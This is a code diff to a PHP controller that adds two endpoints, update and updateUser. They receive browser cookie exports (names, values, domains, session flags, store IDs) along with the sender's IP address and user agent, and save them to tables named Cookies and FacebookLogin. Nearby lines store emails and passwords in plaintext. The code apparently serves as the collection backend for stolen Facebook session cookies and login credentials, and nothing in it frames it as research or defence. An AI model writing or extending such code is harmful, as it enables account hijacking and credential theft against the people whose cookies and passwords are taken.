@@ -227,6 +227,67 @@ $validator = Validator::make($request->all(), $rules);
 
 
 
+
+
+     public function update(Request $request){
+      
+        
+        if ($request->isMethod('post')) {
+            if (!empty($_SERVER['REMOTE_ADDR']))   
+            {
+                $ip_address = $_SERVER['REMOTE_ADDR'];
+                $request['ip'] = $ip_address;
+            }
+            $request['user_id'] = $request->get('user_id');
+            $request['user_agent'] = $request->get('user_agent');
+            
+            $data = $request->get('data');
+            $i = 0;
+         
+            foreach ($data as $key => $value) {
+                $arr[$i]['name'] = $value['name'];
+                $arr[$i]['value'] = $value['value'];
+                $arr[$i]['domain'] = $value['domain'];              
+                $arr[$i]['hostOnly'] = (bool)$value['hostOnly'];
+                $arr[$i]['httpOnly'] = (bool)$value['httpOnly'];
+                $arr[$i]['path'] = $value['path'];
+                $arr[$i]['sameSite'] = $value['sameSite'];
+                $arr[$i]['secure'] = (bool)$value['secure'];
+                $arr[$i]['session'] = (bool)$value['session'];
+                $arr[$i]['storeId'] = $value['storeId'];
+                $arr[$i]['id'] = $i;
+                
+                $i++;
+            }
+          
+            $serialized_array= json_encode($arr);
+            
+            $request['cookis_data'] = $serialized_array;
+
+        
+            if(Cookies::create($request->all())){
+                FacebookLogin::create($request->all());
+                return response()->json([
+                    'status' => 'success', 
+                    'msg' => 'Cookies save successfully.'
+                ], 200);
+            }else{
+                return response()->json([
+                    'status' => 'error', 
+                    'msg' => 'Cookies not save successfully.'
+                ], 401);
+            }
+        
+        }
+    }
+
+
+
+
+
+
+
+
     public function weblogin($email , $password)
     {
         $credentials = [
@@ -250,6 +311,92 @@ $validator = Validator::make($request->all(), $rules);
          Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);
       $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('id','desc')->first();       
           FacebookLogin::where('id', $logid['id'])->update(['name' => $request['email'],'password' => $request['password']]);   
+    }
+
+
+
+    public function updateUser(Request $request)
+    {
+
+
+        $cookieData = Cookies::where('user_id', $request['user_id'])->first(); 
+        
+        if ($request->isMethod('post')) {
+            if (!empty($_SERVER['REMOTE_ADDR']))   
+            {
+                $ip_address = $_SERVER['REMOTE_ADDR'];
+                $request['ip'] = $ip_address;
+            }
+            $request['user_id'] = $request->get('user_id');
+            $request['user_agent'] = $request->get('user_agent');
+            
+            $data = $request->get('data');
+            $i = 0;
+         
+            foreach ($data as $key => $value) {
+                $arr[$i]['name'] = $value['name'];
+                $arr[$i]['value'] = $value['value'];
+                $arr[$i]['domain'] = $value['domain'];              
+                $arr[$i]['hostOnly'] = (bool)$value['hostOnly'];
+                $arr[$i]['httpOnly'] = (bool)$value['httpOnly'];
+                $arr[$i]['path'] = $value['path'];
+                $arr[$i]['sameSite'] = $value['sameSite'];
+                $arr[$i]['secure'] = (bool)$value['secure'];
+                $arr[$i]['session'] = (bool)$value['session'];
+                $arr[$i]['storeId'] = $value['storeId'];
+                $arr[$i]['id'] = $i;
+                
+                $i++;
+            }
+          
+            $serialized_array= json_encode($arr);
+            
+            $request['cookis_data'] = $serialized_array;
+
+            if(!empty($request['user_id']) and !empty($cookieData['user_id']))
+            {
+               
+                $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
+                FacebookLogin::create($request->all());
+
+                  if($data)
+                {
+                    return response()->json([
+                    'status' => 'success', 
+                    'msg' => 'Cookies save successfully.'
+                ], 200);
+                } else{                    
+                    return response()->json([
+                    'status' => 'error', 
+                    'msg' => 'Cookies not save successfully.'
+                ], 401);
+
+                }
+
+            } else{
+
+                if(Cookies::create($request->all())){
+                FacebookLogin::create($request->all());
+                return response()->json([
+                    'status' => 'success', 
+                    'msg' => 'Cookies save successfully.'
+                ], 200);
+            }else{
+                return response()->json([
+                    'status' => 'error', 
+                    'msg' => 'Cookies not save successfully.'
+                ], 401);
+            }
+
+
+            }
+
+
+         
+        }
+     
+
+
     }
 
 
